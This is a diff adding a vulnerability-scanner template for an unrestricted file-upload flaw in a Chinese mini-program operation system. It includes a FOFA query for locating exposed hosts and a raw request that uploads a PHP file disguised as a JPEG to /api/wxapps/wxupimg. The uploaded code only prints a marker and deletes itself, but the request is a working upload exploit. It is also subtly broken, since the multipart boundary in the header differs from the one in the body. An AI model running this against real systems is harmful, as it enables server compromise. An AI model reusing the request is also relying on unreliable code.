@@ -1,0 +1,33 @@
+id: miniapp-operation-platform-upload
+
+info:
+  name: "全行业小程序运营系统 Wxapps.php 文件上传未限制"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: Fofa:"/com/css/head_foot.css"
+          全行业小程序运营系统是一个无需编程，各行业模版直接套用，一键生成，轻松搭建小程序，界面自由DIY，同步实时预览，可视化操作让您所见即所得，随心打造个性小程序。 /api/controller/Wxapps.php 控制器的wxupimg方法调用ThinkPHP框架的file()函数处理文件上传请求，但未实施有效的文件类型和内容验证机制，导致攻击者可上传恶意文件。
+  tags: 全行业小程序运营系统
+
+http:
+- raw:
+  - |
+    POST /api/wxapps/wxupimg HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNGBhBIC624F4IANg
+    Connection: keep-alive
+
+    ------WebKitFormBoundary03rNBzFMIytvpWhy
+    Content-Disposition: form-data; name="file"; filename="NTest.php"
+    Content-Type: image/jpeg
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+    ------WebKitFormBoundary03rNBzFMIytvpWhy--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
